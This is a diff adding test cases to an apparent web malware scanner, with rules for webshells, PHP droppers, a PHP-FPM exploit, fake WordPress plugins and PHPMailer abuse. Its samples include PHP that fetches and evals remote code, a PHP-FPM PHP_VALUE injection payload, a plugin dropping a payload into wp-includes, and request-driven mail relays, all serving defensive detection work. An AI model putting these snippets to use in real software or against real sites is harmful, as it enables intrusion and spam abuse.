@@ -1306,6 +1306,14 @@ $root_path = $_SERVER['DOCUMENT_ROOT'];
 `,
 		},
 		{
+			name: "Tiny File Manager header without an auth array",
+			rule: "webshell_tiny_file_manager",
+			want: true,
+			sample: `<?php
+/** Tiny File Manager - https://tinyfilemanager.github.io */
+`,
+		},
+		{
 			name: "security plugin blocklisting the file manager name",
 			rule: "webshell_tiny_file_manager",
 			sample: `<?php
@@ -1349,6 +1357,22 @@ if (in_array(basename($path), $suspicious, true)) {
 $response = wp_remote_get('https://raw.githubusercontent.com/acct/repo/main/stage.txt');
 $body = wp_remote_retrieve_body($response);
 eval($body);
+`,
+		},
+		{
+			name: "raw GitHub payload required directly",
+			rule: "php_dropper_raw_github",
+			want: true,
+			sample: `<?php
+REQUIRE_ONCE 'HTTPS://RAW.GITHUBUSERCONTENT.COM/acct/repo/main/stage.php';
+`,
+		},
+		{
+			name: "raw GitHub URL passed through a custom evaluator loader",
+			rule: "php_dropper_raw_github",
+			want: true,
+			sample: `<?php
+eval($loader('https://raw.githubusercontent.com/acct/repo/main/stage.txt'));
 `,
 		},
 		{
@@ -1420,6 +1444,15 @@ if (!file_exists($target)) {
 `,
 		},
 		{
+			name: "JavaScript bundle holding webmail UI strings",
+			rule: "phishing_webmail",
+			ext:  ".js",
+			sample: `const product = "Roundcube";
+const heading = "Webmail Login";
+const passwordAttribute = 'type="password"';
+`,
+		},
+		{
 			name: "PHP-FPM path underflow exploit",
 			rule: "exploit_php_fpm_rce",
 			ext:  ".py",
@@ -1429,6 +1462,23 @@ if (!file_exists($target)) {
 PATH_INFO = "/index.php/PHP" + "\n"
 payload = "auto_prepend_file%0d%0aPHP_VALUE%0d%0aallow_url_include%3DOn"
 send(target, path_info=PATH_INFO, body=payload)
+`,
+		},
+		{
+			name: "encoded FastCGI setting without path underflow markers",
+			rule: "exploit_php_fpm_rce",
+			ext:  ".py",
+			sample: `setting = "%0d%0aPHP_VALUE%0d%0amemory_limit%3D256M"
+send_configuration(setting)
+`,
+		},
+		{
+			name: "PHP-FPM underflow with PATH_INFO and a different PHP_VALUE",
+			rule: "exploit_php_fpm_rce",
+			ext:  ".go",
+			want: true,
+			sample: `payload := "PATH_INFO=/index.php/PHP%0d%0aPHP_VALUE%0d%0asession.auto_start%3D1"
+send(target, payload)
 `,
 		},
 		{
@@ -1467,6 +1517,15 @@ function cw_install() {
 `,
 		},
 		{
+			name: "fake plugin inflating a PHP payload on activation",
+			rule: "exploit_wp_fake_plugin_installer",
+			want: true,
+			sample: `<?php
+register_activation_hook(__FILE__, 'activate_payload');
+file_put_contents(ABSPATH . 'wp-includes/cache.php', gzinflate($packed));
+`,
+		},
+		{
 			name: "PHPMailer relay taking its recipient from the request",
 			rule: "mailer_phpmailer_abuse",
 			want: true,
@@ -1491,6 +1550,37 @@ $mailer->addAddress(get_option('admin_email'), sanitize_text_field($_POST['name'
 $mailer->Body = wp_kses_post($_POST['message']);
 $mailer->send();
 mail(get_option('admin_email'), 'Contact form copy', $body);
+`,
+		},
+		{
+			name: "JavaScript documentation for an unsafe PHPMailer relay",
+			rule: "mailer_phpmailer_abuse",
+			ext:  ".js",
+			sample: `// Unsafe PHPMailer example:
+// $mailer->addAddress($_POST['rcpt']);
+// mail($_POST['rcpt'], $_POST['subject'], $_POST['body']);
+`,
+		},
+		{
+			name: "XML documentation embedding an unsafe PHPMailer example",
+			rule: "mailer_phpmailer_abuse",
+			ext:  ".xml",
+			sample: `<?xml version="1.0"?>
+<example><![CDATA[
+PHPMailer
+$mailer->addAddress($_POST['rcpt']);
+mail($_POST['rcpt'], $_POST['subject'], $_POST['body']);
+]]></example>
+`,
+		},
+		{
+			name: "PHPMailer relay taking a BCC recipient from the request",
+			rule: "mailer_phpmailer_abuse",
+			want: true,
+			sample: `<?
+$mailer = new PHPMailer();
+$mailer->addBCC($_REQUEST['bcc']);
+mail($fallback, $subject, $body);
 `,
 		},
 		{
